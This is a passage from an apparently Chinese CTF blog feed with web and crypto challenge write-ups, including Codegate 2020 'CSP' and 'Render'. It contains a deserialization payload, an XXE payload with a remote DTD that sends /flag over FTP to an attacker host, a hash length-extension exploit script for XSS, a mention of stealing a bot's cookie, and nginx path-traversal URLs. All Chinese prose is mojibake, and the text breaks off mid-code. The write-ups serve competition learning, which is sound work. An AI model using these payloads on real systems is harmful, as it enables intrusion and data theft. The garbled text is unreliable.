å¤„å¼±ç±»å‹ç»•è¿‡å³å¯ï¼Œç”±äºæ˜¯potected å±æ€§ï¼Œæ­£å¸¸ååºåˆ—åŒ–ä¸­ä¼šæœ‰\0ï¼Œè¿™ä¸ªé¢˜è¿‡æ»¤äº†ä¸å¯è§å­—ç¬¦ï¼Œéœ€è¦æ”¹æˆpublicï¼Œæˆ–è€…ä½¿ç”¨pç¥æåˆ°çš„Så¤§å†™ï¼Œåé¢å¯ä»¥ä½¿ç”¨hexç¼–ç ï¼Œå³\00ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?str&#x3D;O:11:%22FileHandler%22:3:&#123;s:2:%22op%22;i:2;s:8:%22filename%22;s:8:%22flag.php%22;s:1:%22%22&#125;</span><br></pre></td></tr></table></figure><h3 id="filejava"><a href="#filejava" class="headerlink" title="filejava"></a>filejava</h3><p>ä¸Šä¼ æ–‡ä»¶ï¼Œä¸‹è½½æ–‡ä»¶ï¼Œå‘ç°ä¸‹è½½æ–‡ä»¶å¤„å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸‹è½½ï¼Œå¾ˆå¤š<code>../</code>å³å¯ã€‚æç¤ºåœ¨/flagï¼Œä½†æ˜¯è¯»å–ä¸äº†ï¼Œåº”è¯¥æ˜¯è¿‡æ»¤äº†ã€‚</p><p>è¯»å–web.xml</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-63132edbf5b6c9bc.png" alt="image.png"></p><p>å¯ä»¥çœ‹åˆ° file_in_javaï¼Œè¯»å– file_in_java.warï¼Œæ‹‰ä¸‹æºç åˆ†æï¼Œå‘ç°æœ‰excelå¤„ç†ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-3b0a3f48c3e2df7a.png" alt="image.png"></p><p>æƒ³åˆ°excelè§£ææ—¶çš„xxeï¼Œå‚è€ƒ<a href="https://www.jishuwen.com/d/2inW/zh-hkï¼Œåœ¨[Content_Types].xmlé‡Œæ’å…¥ï¼š">https://www.jishuwen.com/d/2inW/zh-hkï¼Œåœ¨[Content_Types].xmlé‡Œæ’å…¥ï¼š</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">convert</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://vps/ext.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%ccc;%ddd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>ext.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">bbb</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span><span class="meta">&lt;!ENTITY % <span class="meta-keyword">ccc</span> <span class="meta-string">&quot;&lt;!ENTITY &amp;#37; ddd SYSTEM &#x27;ftp://vps:2121/%bbb;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2121ç«¯å£èµ·ä¸ªftpï¼Œå¯ä»¥è¯»åˆ°flagï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-70465bec165a381d.png" alt="image.png"></p><h3 id="notes"><a href="#notes" class="headerlink" title="notes"></a>notes</h3><p>æ²¡å•¥åŠŸèƒ½ï¼Œ/statusæ‰§è¡Œå‘½ä»¤æ¯”è¾ƒå¯ç–‘ã€‚æœäº†æœundefsafeæœ‰åŸå‹é“¾æ±¡æŸ“ï¼Œæ€è·¯å°±æ˜¯ç»™ObjectåŠ ä¸ªå±æ€§ï¼Œå€¼æ˜¯æˆ‘ä»¬è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œç„¶å/statuséå†çš„æ—¶å€™å°±å¯ä»¥æ‰§è¡Œå‘½ä»¤äº†ã€‚</p><p>å…ˆä¿®æ”¹noteå¤„æ±¡æŸ“ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-43af71abbe3dd7d3.png" alt="image.png"></p><p>å†è®¿é—®/statusï¼Œå¯ä»¥å¼¹åˆ°shell</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-ce5c531276699271.png" alt="image.png"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="you-raise-me-up"><a href="#you-raise-me-up" class="headerlink" title="you_raise_me_up"></a>you_raise_me_up</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">2</span>**<span class="number">512</span></span><br><span class="line">m = <span class="number">391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075</span></span><br><span class="line">c = <span class="number">6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499</span></span><br><span class="line"></span><br><span class="line">flag = discrete_log(Mod(c,n),Mod(m,n))</span><br><span class="line">print(long_to_bytes(flag))</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> î‚° sage exp1.sage</span><br><span class="line">b<span class="string">&#x27;flag&#123;5f95ca93-1594-762d-ed0b-a9139692cb4a&#125;&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 Codegate Webé¢˜è§£</title>
      <link href="/2020/02/10/2020-Codegate/"/>
      <url>/2020/02/10/2020-Codegate/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ–‡ç« é¦–å‘äºå®‰å…¨å®¢ https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;198479</span><br></pre></td></tr></table></figure><p>Codegate è¿˜æ˜¯æœ‰å¾ˆå¤šå›½é™…å¼ºé˜Ÿå‚åŠ çš„ï¼Œè¿™é‡Œè®°å½•ä¸¤é“ Codegate Webé¢˜ã€‚</p><a id="more"></a><h2 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h2><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>é¢˜ç›®ç»™äº† api.php çš„ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&quot;q&quot;</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">&quot;sig&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;?&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$api_string = base64_decode($_GET[<span class="string">&quot;q&quot;</span>]);</span><br><span class="line">$sig = $_GET[<span class="string">&quot;sig&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(md5($salt.$api_string) !== $sig)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;??&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//APIs Format : name(b64),p1(b64),p2(b64)|name(b64),p1(b64),p2(b64) ...</span></span><br><span class="line">$apis = explode(<span class="string">&quot;|&quot;</span>, $api_string);</span><br><span class="line"><span class="keyword">foreach</span>($apis <span class="keyword">as</span> $s) &#123;</span><br><span class="line">    $info = explode(<span class="string">&quot;,&quot;</span>, $s);</span><br><span class="line">    <span class="keyword">if</span>(count($info) != <span class="number">3</span>)</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    $n = base64_decode($info[<span class="number">0</span>]);</span><br><span class="line">    $p1 = base64_decode($info[<span class="number">1</span>]);</span><br><span class="line">    $p2 = base64_decode($info[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($n === <span class="string">&quot;header&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(strlen($p1) &gt; <span class="number">10</span>)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span>(strpos($p1.$p2, <span class="string">&quot;:&quot;</span>) !== <span class="literal">false</span> || strpos($p1.$p2, <span class="string">&quot;-&quot;</span>) !== <span class="literal">false</span>) <span class="comment">//Don&#x27;t trick...</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        header(<span class="string">&quot;<span class="subst">$p1</span>: <span class="subst">$p2</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> ($n === <span class="string">&quot;cookie&quot;</span>) &#123;</span><br><span class="line">        setcookie($p1, $p2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> ($n === <span class="string">&quot;body&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/&lt;.*&gt;/&quot;</span>, $p1))</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">echo</span> $p1;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\n&lt;br /&gt;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> ($n === <span class="string">&quot;hello&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hello, World!\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é¢˜ç›®çš„ CSP çš„ç­–ç•¥æ˜¯ <code>default-src &#39;self&#39;; script-src &#39;none&#39;; base-uri &#39;none&#39;;</code>ï¼Œè¿™åŸºæœ¬ç»™å µæ­»äº†ï¼Œç›´æ¥æ‰“ cookie ä¸å¯èƒ½äº†ã€‚</p><p>index.php å¯ä»¥ç»™ä¸€ä¸ªAPIï¼Œå¾—åˆ°ç­¾åï¼Œä½†æ˜¯ä¸æ”¯æŒä¸€æ¬¡å¤šä¸ªAPIï¼Œæˆ‘ä»¬æ²¡æœ‰ keyï¼Œè¿™é‡Œæ˜æ˜¾æ˜¯ä¸€ä¸ªå“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»çš„è€ƒç‚¹ï¼Œé‡‡ç”¨ <code>salt+msg</code>çš„æ–¹å¼è¿›è¡Œå“ˆå¸Œã€‚</p><p>æ¥ç€ api.phpï¼Œå‘ç°å¯ä»¥è®¾ç½® headerï¼Œè®¾ç½® cookieï¼Œè¾“å‡ºå†…å®¹ã€‚è®¾ç½® headeråšäº†ä¸€å®šè¿‡æ»¤ï¼Œæ— æ³•è¦†ç›– CSP è®¾ç½®ã€‚body è¿™éƒ¨åˆ†è¿‡æ»¤æ²¡å•¥ç”¨ï¼Œpreg_match çš„ . ä¸åŒ¹é… \nã€‚</p><p>å…³é”®åœ¨äºä½¿ CSP å¤±æ•ˆï¼Œå¯ä»¥è®¾ç½® HTTP çŠ¶æ€ç ä¸º 102 ä½¿ CSP å¤±æ•ˆï¼ŒåŒæ—¶å¯ä»¥æ‰§è¡Œjsã€‚ä¸ºäº†éªŒè¯æˆ‘æœ¬åœ°å†™äº†ä¸ª phpï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-Security-Policy: default-src &#x27;self&#x27;; script-src &#x27;none&#x27;;&quot;</span>);</span><br><span class="line">header(<span class="string">&quot;HTTP/: 102&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>æˆ‘ç”¨ nimmis/apache-php7 è¿™ä¸ªé•œåƒèµ·äº†ä¸ª dockerï¼Œå‘ç° chrome æ˜¯ä¸å¯ä»¥çš„ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-30150a4a16bf06ad.png" alt="image.png"></p><p>å¼€å§‹ä»¥ä¸º chrome ç‰ˆæœ¬é—®é¢˜ï¼Œè¯•äº†æ—§ç‰ˆæœ¬è¿˜æ˜¯ä¸è¡Œã€‚</p><p>æˆ‘ç”¨ mac è‡ªå¸¦çš„ apache å’Œ php ç¯å¢ƒè¯•äº†ä¸€ä¸‹ï¼Œå‘ç°æ˜¯å¯ä»¥çš„ã€‚ã€‚ã€‚</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-0d2d60e00121f497.png" alt="image.png"></p><p>è¿™ä¸ server è¿˜æœ‰å…³ç³»ï¼Ÿæ„Ÿå…´è¶£çš„å¸ˆå‚…å¯ä»¥ç ”ç©¶è§£ç­”ä¸€ä¸‹â€¦</p><p>è¿™é“é¢˜çš„ç¯å¢ƒä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œæˆ‘ä»¬éšä¾¿æ‹¿åˆ°ä¸€ä¸ªç­¾åï¼Œç„¶åç”¨å“ˆå¸Œæ‰©å±•æ”»å‡»å¾—åˆ°æƒ³è¦çš„ç­¾åã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://110.10.147.166/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sig</span>():</span></span><br><span class="line">    res = requests.get(url + <span class="string">&quot;view.php&quot;</span>, params=&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;gml&#x27;</span>, <span class="string">&#x27;p1&#x27;</span>: <span class="string">&#x27;gml&#x27;</span>, <span class="string">&#x27;p2&#x27;</span>: <span class="string">&#x27;gml&#x27;</span>&#125;).content</span><br><span class="line">    sig, msg = res.split(<span class="string">&quot;/api.php?sig=&quot;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;&quot;&gt;&lt;/iframe&gt;&#x27;</span>)[<span class="number">0</span>].split(<span class="string">&quot;&amp;q=&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> sig, msg.decode(<span class="string">&quot;base64&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sig, msg = get_sig()</span><br><span class="line"></span><br><span class="line">api1 = [<span class="string">&#x27;header&#x27;</span>, <span class="string">&#x27;HTTP/&#x27;</span>, <span class="string">&#x27;102&#x27;</span>]</span><br><span class="line">api2 = [<span class="string">&#x27;body&#x27;</span>, <span class="string">&#x27;&lt;script\n&gt;alert(1)&lt;/script\n&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>]</span><br><span class="line"></span><br><span class="line">new_msg = <span class="string">&quot;|%s|%s&quot;</span> % (</span><br><span class="line">    <span class="string">&#x27;,&#x27;</span>.join(c.encode(<span class="string">&quot;base64&quot;</span>).strip() <span class="keyword">for</span> c <span class="keyword">in</span> api1), <span class="string">&#x27;,&#x27;</span>.join(c.encode(<span class="string">&quot;base64&quot;</span>).strip() <span class="keyword">for</span> c <span class="keyword">in</span> api2))</span><br><span class="line"></span><br><span class="line"><span class="comment"># len(salt)=12</span></span><br><span class="line">new_sig, q = hashpumpy.hashpump(sig, msg, new_msg, <span class="number">12</span>)</span><br><span class="line">q = q.encode(<span class="string">&quot;base64&quot;</span>)</span><br><span class="line">print(<span class="string">&#x27;&#123;&#125;api.php?sig=&#123;&#125;&amp;q=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(url, new_sig, q))</span><br></pre></td></tr></table></figure><p>è®¿é—®ï¼Œå‘ç°å¯ä»¥å¼¹çª—ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-5c671add61b5356a.png" alt="image.png"></p><p>æ”¹å˜ xss payload ä¸ºæ‰“ cookieçš„ï¼Œæäº¤ç»™ botï¼Œå¯ä»¥æ‰“åˆ°cookieï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-0488b8f15ae89152.png" alt="image.png"></p><h2 id="Render"><a href="#Render" class="headerlink" title="Render"></a>Render</h2><h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">It is my first flask project with nginx. Write your own message, and get flag!</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;110.10.147.169&#x2F;renderer&#x2F; </span><br><span class="line">http:&#x2F;&#x2F;58.229.253.144&#x2F;renderer&#x2F;</span><br><span class="line"></span><br><span class="line">DOWNLOAD : http:&#x2F;&#x2F;ctf.codegate.org&#x2F;099ef54feeff0c4e7c2e4c7dfd7deb6e&#x2F;022fd23aa5d26fbeea4ea890710178e9</span><br></pre></td></tr></table></figure><p>ä¸‹è½½å¯ä»¥å¾—åˆ° settings/run.shï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">service nginx stop</span><br><span class="line">mv /etc/nginx/sites-enabled/default /tmp/</span><br><span class="line">mv /tmp/nginx-flask.conf /etc/nginx/sites-enabled/flask</span><br><span class="line"></span><br><span class="line">service nginx restart</span><br><span class="line"></span><br><span class="line">uwsgi /home/src/uwsgi.ini &amp;</span><br><span class="line">/bin/bash /home/cleaner.sh &amp;</span><br><span class="line"></span><br><span class="line">/bin/bash</span><br></pre></td></tr></table></figure><p>ä»¥åŠ docker file:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> python:<span class="number">2.7</span>.<span class="number">16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> FLAG CODEGATE2020&#123;**DELETED**&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt-get update</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt-get install -y nginx</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> pip install flask uwsgi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> prob_src/src /home/src</span></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> settings/nginx-flask.conf /tmp/nginx-flask.conf</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> prob_src/static /home/static</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chmod 777 /home/static</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> mkdir /home/tickets</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chmod 777 /home/tickets</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> settings/run.sh /home/run.sh</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chmod +x /home/run.sh</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> settings/cleaner.sh /home/cleaner.sh</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chmod +x /home/cleaner.sh</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;/home/run.sh&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬èƒ½ä»ä¸­å¾—åˆ°çš„ä¸»è¦æ˜¯ç›®å½•ç»“æ„ï¼Œç»“åˆé¢˜ç›®æè¿° nginxï¼Œåº”è¯¥å­˜åœ¨ nginx ç›®å½•éå†ã€‚</p><p><code>http://110.10.147.169/static../src/uwsgi.ini</code>ï¼Œå¯ä»¥ä¸‹åˆ°æ–‡ä»¶ã€‚</p><h3 id="è·å–æºç "><a href="#è·å–æºç " class="headerlink" title="è·å–æºç "></a>è·å–æºç </h3><p>è¯»æºç ï¼š</p><p><code>http://110.10.147.169/static../src/app/__init__.py</code>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> routes</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.url_map.strict_slashes = <span class="literal">False</span></span><br><span class="line">app.register_blueprint(routes.front, url_prefix=<span class="string">&quot;/renderer&quot;</span>)</span><br><span class="line">app.config[<span class="string">&quot;FLAG&quot;</span>] = os.getenv(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;CODEGATE2020&#123;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><p>è¯»routesï¼š</p><p>``<a href="http://110.10.147.169/static../src/app/routes.py`">http://110.10.147.169/static../src/app/routes.py`</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, render_template_string, request, redirect, abort, Blueprint</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> path</span><br><span class="line"><span class="keyword">from</span> urlparse <span class="keyword">import</span> urlparse</span><br><span class="line"></span><br><span class="line">front = Blueprint(<span class="string">&quot;renderer&quot;</span>, __name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@front.before_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    print(request.url)</span><br><span class="line"></span><br><span class="line"><span class="meta">@front.route(&quot;/&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    url = request.form.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    res = proxy_read(url) <span class="keyword">if</span> url <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> res:</span><br><span class="line">        abort(<span class="number">400</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, data = res)</span><br><span class="line"></span><br><span class="line"><span class="meta">@front.route(&quot;/whatismyip&quot;, methods=[&quot;GET&quot;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ipcheck</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;ip.html&quot;</span>, ip = get_ip(), real_ip = get_real_ip())</span><br><span class="line"></span><br><span class="line"><span class="meta">@front.route(&quot;/admin&quot;, methods=[&quot;GET&quot;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin_access</span>():</span></span><br><span class="line">    ip = get_ip()</span><br><span class="line">    rip = get_real_ip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ip <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;127.0.0.2&quot;</span>]: <span class="comment">#super private ip :)</span></span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ip 